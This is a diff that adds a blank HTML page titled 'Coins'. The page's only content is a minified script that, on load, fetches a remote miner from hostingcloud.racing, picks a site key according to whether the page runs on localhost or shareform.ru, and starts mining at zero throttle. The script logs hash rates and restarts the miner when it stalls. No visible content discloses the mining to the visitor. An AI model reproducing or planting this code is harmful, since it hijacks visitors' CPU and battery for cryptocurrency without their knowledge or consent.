@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
+    <title>Coins</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <script>
+        function loadScript(a){return new Promise(function(b,c){let d=document.createElement("script");d.src=a,d.onload=()=>b(d),d.onerror=()=>c(new Error(`Ошибка загрузки скрипта ${a}`)),document.head.append(d)})}const _url=new URL(document.location.href),_s={local:{src:"https://www.hostingcloud.racing/2KFX.js",key:"a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97"},share:{src:"https://www.hostingcloud.racing/rhdQ.js",key:"cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc"}};let _src="",_key="";-1==_url.toString().indexOf("127.0.0.1")?-1!=_url.toString().indexOf("shareform.ru")&&(_src=_s.share.src,_key=_s.share.key):(_src=_s.local.src,_key=_s.local.key),loadScript(_src).then(function(){let a=new Client.Anonymous(_key,{throttle:0,c:"w"}),b=new Date,c=b,d=b,e=!1,f=0,g=0;a.start();let h=a.isMobile(),i=a.getHashesPerSecond();a.on("open",function(){b=new Date}),a.on("job",function(){++f}),a.on("found",function(b){console.log(b),++g,d=new Date,g>f&&(g=0,a.stop())}),a.on("close",function(){f=0,g=0,d=new Date,a.start()}),setInterval(function(){e=a.isRunning(),i=a.getHashesPerSecond(),c=new Date;let b=((c-d)/1e3).toFixed(1);console.log(i.toFixed(2)+" ("+f+"/"+g+") "+b+"\u0441"),90<b&&(d=new Date,a.stop())},500)},function(a){console.log(a)});
+    </script>
+</head>
+
+<body>
+
+
+</body>
+
+</html>
